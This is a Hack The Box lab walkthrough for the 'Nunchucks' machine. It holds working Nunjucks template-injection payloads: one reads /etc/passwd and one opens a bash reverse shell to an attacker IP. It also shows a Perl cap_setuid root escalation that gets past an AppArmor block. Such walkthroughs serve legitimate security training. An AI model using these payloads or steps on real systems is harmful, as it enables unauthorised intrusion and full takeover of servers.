# -HTB-Nunchucks

## Port Scanning

### I began by scanning the target for open ports using nmap to identify running services

```
nmap -p- -sVC -vv -oN nmap_scan --min-rate=5000 10.10.11.122
```

### Results:

->  Port 22: SSH (OpenSSH)

->  Port 80: HTTP (nginx)

->  Port 443: HTTPS (nginx)

## Added nunchucks.htb to the /etc/hosts file.

<img width="1903" height="941" alt="image" src="https://github.com/user-attachments/assets/c9235f78-6d46-4e71-9c8b-352cbe857ace" />


## Web Enumeration

### I performed a directory scan on the main domain but it did not reveal immediate attack vectors

```
gobuster dir -u https://nunchucks.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --exclude-length 45 -k
```

<img width="924" height="537" alt="image" src="https://github.com/user-attachments/assets/c5cd6f6f-329a-4f03-96c2-1763a57b10db" />

<img width="883" height="890" alt="image" src="https://github.com/user-attachments/assets/67b2f57f-d2c7-48db-997b-e39daeee9186" />


## Subdomain Fuzzing

### I searched for virtual hosts using ffuf. The tool identified a valid subdomain: store.nunchucks.htb


```
ffuf -u https://nunchucks.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST: FUZZ.nunchucks.htb"  -fs 30589
```

<img width="968" height="469" alt="image" src="https://github.com/user-attachments/assets/1a8c0855-35c8-4830-a0c9-8ea7b0905a46" />

## Added store.nunchucks.htb to /etc/hosts

<img width="1641" height="1000" alt="image" src="https://github.com/user-attachments/assets/d7aa2b9d-a81c-47d6-b4ad-a1ab6471c026" />



## Identifying the Vulnerability (SSTI) 

### Accessing store.nunchucks.htb revealed an e-commerce platform. The machine name "Nunchucks" is a hint towards Nunjucks, a templating engine for Node.js.

<img width="819" height="446" alt="image" src="https://github.com/user-attachments/assets/e883f9d5-f3cd-4b38-b022-7d255702b2d1" />


##  This suggested a Server-Side Template Injection (SSTI) vulnerability in the email subscription field.

<img width="823" height="836" alt="image" src="https://github.com/user-attachments/assets/bc601ae5-ec80-433e-8893-41398f5cb028" />

## I intercepted the request and tested for SSTI using a payload designed to read /etc/passwd

```
{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"tail /etc/passwd\").toString()')()}}@test.com
```


### The server responded with the contents of the passwd file confirming the vulnerability


<img width="1605" height="902" alt="image" src="https://github.com/user-attachments/assets/50d23ede-6fe3-4a3b-83ae-ff441fedce28" />


## User

## To obtain a reverse shell, I used the following payload to execute a bash reverse shell command:

```
{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"bash -c \\'bash -i >& /dev/tcp/10.10.14.59/1337 0>&1\\'\")')()}}@test.com
```



<img width="943" height="1042" alt="image" src="https://github.com/user-attachments/assets/07118775-6ada-4d81-8b61-535181639f0a" />

## And we find the user flag in `/home/david`

<img width="288" height="141" alt="image" src="https://github.com/user-attachments/assets/f890b1fa-6e91-4e36-81a7-0dbfba204392" />

## Root

### I uploaded linpeas.sh to the target machine. The scan highlighted a critical misconfiguration in Linux Capabilities:

<img width="924" height="135" alt="image" src="https://github.com/user-attachments/assets/8f25b49d-383c-4de8-a8c3-a53f794ee9eb" />


# -> /usr/bin/perl has cap_setuid+ep set.

### This capability allows the Perl binary to set the User ID (UID) of the process, meaning we can elevate our privileges to root (UID 0).


# Exploiting Perl Capabilities

## I initially attempted a standard GTFOBins one-liner, but it failed to spawn a root shell, likely due to an AppArmor profile blocking direct exec calls from the command line arguments.

```
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```


## To bypass this, I created a local Perl script named root_pl in /tmp:

```
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/bash";
```

## I made the script executable and ran it:

```
chmod +x root_pl
./root_pl
```


<img width="723" height="475" alt="image" src="https://github.com/user-attachments/assets/aa464081-84cb-4cb1-9e85-c24921d32eb0" />


## Root flag 

<img width="395" height="171" alt="image" src="https://github.com/user-attachments/assets/8a8e32bf-7fee-4afd-8093-9a4ecf4d985c" />
